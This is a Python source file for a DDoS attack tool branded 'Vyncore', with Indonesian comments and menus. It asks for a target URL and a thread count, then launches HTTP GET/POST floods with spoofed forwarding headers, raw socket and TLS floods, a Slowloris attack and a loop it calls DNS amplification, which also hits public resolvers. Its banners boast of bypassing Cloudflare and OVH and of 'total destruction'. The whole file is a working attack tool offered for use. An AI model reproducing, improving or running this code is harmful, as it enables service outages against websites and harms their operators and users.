#!/usr/bin/env python3
"""
DDOS TOOLS PYTHON V10.0 - VYNCORE EDITION
NEMBUS SAMPE AKAR-AKAR! BYPASS SEMUA PROTEKSI!
"""

import os
import sys
import time
import socket
import threading
import random
import requests
from concurrent.futures import ThreadPoolExecutor
import ssl
import json
import urllib.parse

# Warna buat tampilan keren
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Banner brutal
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
    {Colors.RED}{Colors.BOLD}
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║  ██████╗ ██████╗  ██████╗ ███████╗ ██████╗ ███████╗     ║
    ║  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██╔════╝     ║
    ║  ██║  ██║██║  ██║██║   ██║███████╗██║   ██║███████╗     ║
    ║  ██║  ██║██║  ██║██║   ██║╚════██║██║   ██║╚════██║     ║
    ║  ██████╔╝██████╔╝╚██████╔╝███████║╚██████╔╝███████║     ║
    ║  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝     ║
    ║                                                          ║
    ║  {Colors.CYAN}V10.0 - VYNCORE VIP EDITION{Colors.RED}                          ║
    ║  {Colors.YELLOW}NEMBUS SAMPE AKAR-AKAR! BYPASS CLOUDFLARE & OVH!{Colors.RED}  ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    {Colors.END}
    """
    print(banner)

# Generate user-agent acak buat bypass
def random_user_agent():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    return random.choice(agents)

# Generate referer acak
def random_referer():
    referers = [
        'https://www.google.com/',
        'https://www.facebook.com/',
        'https://twitter.com/',
        'https://www.youtube.com/',
        'https://www.bing.com/',
        'https://www.reddit.com/'
    ]
    return random.choice(referers)

# Methods DDOS paling brutal
class DDoSMethods:
    def __init__(self, target_url, threads=500):
        self.target_url = target_url
        self.threads = threads
        self.running = True
        self.parsed_url = urllib.parse.urlparse(target_url)
        self.host = self.parsed_url.netloc
        self.path = self.parsed_url.path if self.parsed_url.path else '/'
        
    # METHOD 1: HTTP FLOOD LEVEL MAX
    def http_flood(self):
        headers = {
            'User-Agent': random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Referer': random_referer()
        }
        
        session = requests.Session()
        session.headers.update(headers)
        
        while self.running:
            try:
                # Randomize headers setiap request
                session.headers['User-Agent'] = random_user_agent()
                session.headers['Referer'] = random_referer()
                session.headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                # Kirim request GET
                response = session.get(self.target_url, timeout=5)
                print(f"{Colors.GREEN}[+] HTTP FLOOD SENT - Status: {response.status_code}{Colors.END}")
                
                # Kirim request POST juga biar makin brutal
                fake_data = {'data': os.urandom(100).hex()}
                response2 = session.post(self.target_url, data=fake_data, timeout=5)
                print(f"{Colors.BLUE}[+] HTTP POST FLOOD SENT - Status: {response2.status_code}{Colors.END}")
                
            except Exception as e:
                print(f"{Colors.RED}[-] Error: {str(e)[:50]}{Colors.END}")
                time.sleep(0.1)
    
    # METHOD 2: SOCKET FLOOD (Low Level)
    def socket_flood(self):
        while self.running:
            try:
                # Buat socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                # Connect ke target
                sock.connect((self.host, 80))
                
                # Kirim request HTTP jahat
                request = f"GET {self.path} HTTP/1.1\r\n"
                request += f"Host: {self.host}\r\n"
                request += f"User-Agent: {random_user_agent()}\r\n"
                request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += f"Connection: keep-alive\r\n"
                request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                time.sleep(0.01)
                sock.close()
                
                print(f"{Colors.YELLOW}[+] SOCKET PACKET INJECTED{Colors.END}")
                
            except Exception as e:
                # Buat socket baru kalau error
                try:
                    sock.close()
                except:
                    pass
    
    # METHOD 3: SSL/TLS FLOOD (Bypass Cloudflare)
    def ssl_flood(self):
        while self.running:
            try:
                # Buat context SSL
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Buat socket biasa dulu
                raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw_socket.settimeout(3)
                
                # Connect
                raw_socket.connect((self.host, 443))
                
                # Wrap dengan SSL
                ssl_socket = context.wrap_socket(raw_socket, server_hostname=self.host)
                
                # Kirim request HTTPS
                request = f"GET {self.path} HTTP/1.1\r\n"
                request += f"Host: {self.host}\r\n"
                request += "Connection: keep-alive\r\n"
                request += f"User-Agent: {random_user_agent()}\r\n"
                request += "\r\n"
                
                ssl_socket.send(request.encode())
                time.sleep(0.05)
                ssl_socket.close()
                
                print(f"{Colors.PURPLE}[+] SSL/TLS ENCRYPTED ATTACK SENT{Colors.END}")
                
            except Exception as e:
                pass
    
    # METHOD 4: SLOWLORIS ATTACK (Bypass OVH)
    def slowloris(self):
        sockets_list = []
        
        # Buat banyak socket connection
        for _ in range(200):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.host, 80))
                
                # Kirim partial request (Slowloris technique)
                sock.send(f"GET {self.path} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.host}\r\n".encode())
                sock.send("User-Agent: {}\r\n".format(random_user_agent()).encode())
                sock.send("Content-Length: 1000000\r\n".encode())
                
                sockets_list.append(sock)
                print(f"{Colors.CYAN}[+] SLOWLORIS SOCKET #{len(sockets_list)} CONNECTED{Colors.END}")
                
            except Exception as e:
                pass
        
        # Keep connections alive dengan kirim data sedikit-sedikit
        while self.running and sockets_list:
            for sock in sockets_list[:]:
                try:
                    sock.send("X-a: b\r\n".encode())
                    time.sleep(random.randint(10, 100) / 10)
                except:
                    try:
                        sock.close()
                        sockets_list.remove(sock)
                    except:
                        pass
    
    # METHOD 5: DNS AMPLIFICATION (Super Brutal)
    def dns_amplification(self):
        # Target DNS server (gunakan DNS resolver umum)
        dns_servers = [
            '8.8.8.8',      # Google DNS
            '1.1.1.1',      # Cloudflare DNS
            '9.9.9.9',      # Quad9
            '208.67.222.222' # OpenDNS
        ]
        
        # Buat DNS query yang besar (amplification)
        dns_query = bytearray()
        # Header
        dns_query.extend(bytes([random.randint(0, 255), random.randint(0, 255)]))  # ID
        dns_query.extend(bytes([0x01, 0x00]))  # Flags
        dns_query.extend(bytes([0x00, 0x01]))  # Questions
        dns_query.extend(bytes([0x00, 0x00]))  # Answer RRs
        dns_query.extend(bytes([0x00, 0x00]))  # Authority RRs
        dns_query.extend(bytes([0x00, 0x00]))  # Additional RRs
        # Query name (spoofed ke target)
        for part in self.host.split('.'):
            dns_query.append(len(part))
            dns_query.extend(part.encode())
        dns_query.append(0x00)  # End of name
        # Query type dan class
        dns_query.extend(bytes([0x00, 0x01]))  # Type A
        dns_query.extend(bytes([0x00, 0x01]))  # Class IN
        
        while self.running:
            for dns_server in dns_servers:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1)
                    # Spoof source IP ke target (pakai raw socket butuh root)
                    sock.sendto(dns_query, (dns_server, 53))
                    sock.close()
                    print(f"{Colors.RED}[+] DNS AMPLIFICATION ATTACK SENT VIA {dns_server}{Colors.END}")
                except:
                    pass
                time.sleep(0.01)

# Main controller
class VyncoreDDOS:
    def __init__(self):
        self.methods = []
        self.thread_pool = None
        
    def start_attack(self, target_url, method_type='all', threads=500):
        print(f"\n{Colors.BOLD}{Colors.RED}🚀 MEMULAI SERANGAN DDOS V10.0!{Colors.END}")
        print(f"{Colors.YELLOW}🎯 Target: {target_url}{Colors.END}")
        print(f"{Colors.CYAN}👥 Threads: {threads}{Colors.END}")
        print(f"{Colors.PURPLE}⚡ Method: {method_type.upper()}{Colors.END}")
        
        # Countdown
        for i in range(3, 0, -1):
            print(f"{Colors.RED}{Colors.BOLD}[!] Attack dimulai dalam {i}...{Colors.END}")
            time.sleep(1)
        
        # Buat instance methods
        ddos = DDoSMethods(target_url, threads)
        
        # Pilih method berdasarkan input
        if method_type == 'all' or method_type == '1':
            print(f"{Colors.GREEN}[+] Starting HTTP FLOOD Method...{Colors.END}")
            for _ in range(threads // 5):
                t = threading.Thread(target=ddos.http_flood)
                t.daemon = True
                t.start()
                self.methods.append(t)
        
        if method_type == 'all' or method_type == '2':
            print(f"{Colors.GREEN}[+] Starting SOCKET FLOOD Method...{Colors.END}")
            for _ in range(threads // 5):
                t = threading.Thread(target=ddos.socket_flood)
                t.daemon = True
                t.start()
                self.methods.append(t)
        
        if method_type == 'all' or method_type == '3':
            print(f"{Colors.GREEN}[+] Starting SSL/TLS FLOOD Method...{Colors.END}")
            for _ in range(threads // 5):
                t = threading.Thread(target=ddos.ssl_flood)
                t.daemon = True
                t.start()
                self.methods.append(t)
        
        if method_type == 'all' or method_type == '4':
            print(f"{Colors.GREEN}[+] Starting SLOWLORIS Method...{Colors.END}")
            for _ in range(min(10, threads // 50)):
                t = threading.Thread(target=ddos.slowloris)
                t.daemon = True
                t.start()
                self.methods.append(t)
        
        if method_type == 'all' or method_type == '5':
            print(f"{Colors.GREEN}[+] Starting DNS AMPLIFICATION Method...{Colors.END}")
            for _ in range(threads // 10):
                t = threading.Thread(target=ddos.dns_amplification)
                t.daemon = True
                t.start()
                self.methods.append(t)
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}✅ SEMUA METHOD AKTIF! SERANGAN BERJALAN!{Colors.END}")
        print(f"{Colors.YELLOW}📊 Total threads aktif: {len(self.methods)}{Colors.END}")
        print(f"{Colors.RED}💀 TARGET AKAN RUSAK TOTAL DALAM BEBERAPA MENIT!{Colors.END}")
        
        # Tunggu sampai user stop
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            ddos.running = False
            print(f"\n{Colors.RED}[!] Menghentikan serangan...{Colors.END}")
            time.sleep(2)
    
    def stop_attack(self):
        print(f"{Colors.RED}[!] Menghentikan semua threads...{Colors.END}")

# Install module yang diperlukan
def install_modules():
    modules_to_install = [
        'requests',
        'colorama'
    ]
    
    print(f"{Colors.YELLOW}[!] Mengecek dan menginstall module yang diperlukan...{Colors.END}")
    
    import subprocess
    import sys
    
    for module in modules_to_install:
        try:
            __import__(module.replace('-', '_'))
            print(f"{Colors.GREEN}[+] Module {module} sudah terinstall{Colors.END}")
        except ImportError:
            print(f"{Colors.YELLOW}[!] Menginstall {module}...{Colors.END}")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module])
            print(f"{Colors.GREEN}[+] {module} berhasil diinstall{Colors.END}")

# Main function
def main():
    show_banner()
    
    # Install module otomatis
    install_modules()
    
    print(f"{Colors.CYAN}{Colors.BOLD}=== DDOS TOOLS V10.0 - VYNCORE VIP ==={Colors.END}\n")
    
    # Input target
    target = input(f"{Colors.YELLOW}[?] Masukkan URL/IP target: {Colors.WHITE}")
    
    if not target.startswith('http'):
        target = 'http://' + target
    
    # Pilih method
    print(f"\n{Colors.CYAN}PILIH METHOD SERANGAN:{Colors.END}")
    print(f"{Colors.GREEN}[1] HTTP FLOOD (High Speed){Colors.END}")
    print(f"{Colors.BLUE}[2] SOCKET FLOOD (Low Level){Colors.END}")
    print(f"{Colors.PURPLE}[3] SSL/TLS FLOOD (Bypass Cloudflare){Colors.END}")
    print(f"{Colors.YELLOW}[4] SLOWLORIS (Bypass OVH){Colors.END}")
    print(f"{Colors.RED}[5] DNS AMPLIFICATION (Super Brutal){Colors.END}")
    print(f"{Colors.WHITE}[all] SEMUA METHOD (Total Destruction){Colors.END}")
    
    method = input(f"\n{Colors.YELLOW}[?] Pilih method [1-5/all]: {Colors.WHITE}").lower()
    
    # Input threads
    try:
        threads = int(input(f"{Colors.YELLOW}[?] Jumlah threads [default: 500]: {Colors.WHITE}") or "500")
    except:
        threads = 500
    
    # Mulai serangan
    ddos = VyncoreDDOS()
    ddos.start_attack(target, method, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program dihentikan{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")
